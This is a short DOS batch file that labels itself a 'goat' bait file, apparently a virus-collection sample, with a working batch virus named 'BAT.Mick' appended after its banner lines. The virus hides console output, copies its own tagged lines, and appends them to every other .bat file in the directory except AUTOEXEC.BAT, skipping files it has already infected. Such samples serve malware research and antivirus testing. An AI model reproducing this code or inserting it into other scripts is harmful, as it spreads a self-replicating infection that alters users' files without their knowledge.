@echo off
echo ***********************************
echo ***********************************
echo ***********************************
echo * Goat bat file. Size = 305 bytes *
echo ***********************************
echo ***********************************
echo ***********************************


@ctty nul%Mick%
if "%1=="Mick goto Mickz
echo.>Mick
find "Mick"<%0>>Mick
for %%b in (*.bat) do if not %%b==AUTOEXEC.BAT call %0 Mick %%b
del Mick
goto Micke
:Mickz
find "Mick"<%2
if not errorlevel 1 goto Micke
type Mick>>%2
:Micke BAT.Mick [BY Promark]
